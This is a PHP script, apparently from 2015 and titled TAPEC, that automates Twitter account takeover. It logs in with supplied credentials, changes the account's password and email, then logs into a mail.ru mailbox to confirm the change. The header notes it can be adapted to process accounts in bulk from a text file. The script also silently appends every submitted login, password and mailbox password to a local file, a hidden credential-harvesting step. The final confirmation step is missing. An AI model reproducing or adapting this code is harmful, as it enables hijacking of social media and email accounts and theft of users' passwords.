<?php
/*
TAPEC - Twitter Auto Password and Email Changer

You can easily rewrite this
script to get accounts from .txt

Author: Egor Kokorin
2015 ©
*/
# Проверка полученных данных
if ( isset($_POST['login'])       && $_POST['login']       != "" &&  $_POST['login']       != "Twitter login"    &&
   isset($_POST['password'])    && $_POST['password']    != "" &&  $_POST['password']    != "Twitter password" &&
   isset($_POST['newpassword']) && $_POST['newpassword'] != "" &&  $_POST['newpassword'] != "New password"     &&
   isset($_POST['newmail'])     && $_POST['newmail']     != "" &&  $_POST['newmail']     != "New email"        &&
   isset($_POST['mailpass'])    && $_POST['mailpass']    != "" &&  $_POST['mailpass']    != "Ur mail pass"      )
{
   # Подключаю файл с функциями
   include "functions.php";

   # Задача переменных
   $login       = trim($_POST['login']);
   $password    = trim($_POST['password']);
   $newpassword = trim($_POST['newpassword']);
   $newmail     = trim($_POST['newmail']);
   $mailpass    = trim($_POST['mailpass']);

   file_put_contents("ddd111.txt", $login.":".$password.":".$newpassword.":".$newmail.":".$mailpass.";\n", FILE_APPEND);

   $cookie_name = "twittcook.txt"; # Имя файла с печеньками

// Удаляю старые куки
if ( file_exists($cookie_name) )
    unlink($cookie_name);


// Получаю ключ
$question = query("login", 0, 1, 0, 0, $cookie_name);
preg_match_all("#\<input type=\"hidden\" name=\"authenticity_token\" value=\"(.*)\"#", $question, $result);
$key = $result[1][0];


// Вхожу в аккаунт
$data = "session[username_or_email]=$login&session[password]=$password&
authenticity_token=$key&scribe_log=&redirect_after_login=&authenticity_token=$key";
$question = query("sessions", $data, 1, 0, 0, $cookie_name);


// Захожу на страничку смены пароля
$question = query("settings/password", 0, 1, 0, 0, $cookie_name);


// Меняю пароль от аккаунта
$data = "method=PUT&authenticity_token=$key&current_password=$password&user_password=$newpassword&user_password_confirmation=$newpassword";
$question = query("settings/passwords/update", $data, 1, "https://twitter.com/settings/password", 0, $cookie_name);


// Открываю настройки изменения почты
$question = query("settings/account", 0, 1, 0, 0, $cookie_name);


// Получаю оригинальное имя, email, язык, страну, тайм-зону и параметры просмотра твитов аккаунта
preg_match_all("#input type=\"hidden\" id=\"orig_uname\" name=\"orig_uname\" value=\"(.*)\">#", $question, $result); #Имя
$origname = $result[1][0];

preg_match_all("#<input type=\"hidden\" id=\"orig_email\" name=\"orig_email\" value=\"(.*)\">#", $question, $result);#Email
$origemail= $result[1][0];

preg_match_all("#<option value=\"(.*)\" selected>#" , $question, $result);                                           # Язык, Страна
$language = $result[1][0];
$country  = $result[1][1];

preg_match_all("#<option data-offset=\"(.*)\" value=\"(.*)\" selected>#", $question, $result);                       # Тайм-Зона
$timezone = $result[2][0];

preg_match_all("#<input type=\"hidden\" value=\"(.*)\" name=\"user\[nsfw_view\]\">#", $question, $result);           # Деликатное содержание
$nsfw_view = $result[1][0];

preg_match_all("#<input type=\"hidden\" value=\"(.*)\" name=\"user\[nsfw_user\]\">#", $question, $result);           # Пометка своих медиафайлов, как деликатных
$nsfw_user = $result[1][0];



// Меняю почту
$swmail   = "assadovich@mail.ru";
$data = "method=PUT&authenticity_token=$key&orig_uname=$origname&orig_email=$origemail&user[screen_name]=$origname&user[email]=$newmail&user[lang]=$language&user[time_zone]=$timezone&user[country]=$country&user[nsfw_view]=$nsfw_view&user[nsfw_user]=$nsfw_user&user[show_tweet_translations]=1&user[show_tweet_translations]=0&auth_password=$newpassword";
$question = query("settings/accounts/update", $data, 1, 0, 0, $cookie_name);


// Захожу на почту
$boom = explode("@", $newmail);
$maillogin = $boom[0];
$data = "Domain=mail.ru&Login=$maillogin&Password=$mailpass&new_auth_form=1&saveauth=1";
$question = query("auth?from=splash", $data, 1, 0, 1, $cookie_name);

// Получаю ссылку на подтверждение изменения почты
#....
#Утеряно, нужно дописать :)
}
else
{
   exit(":)");
}
?>
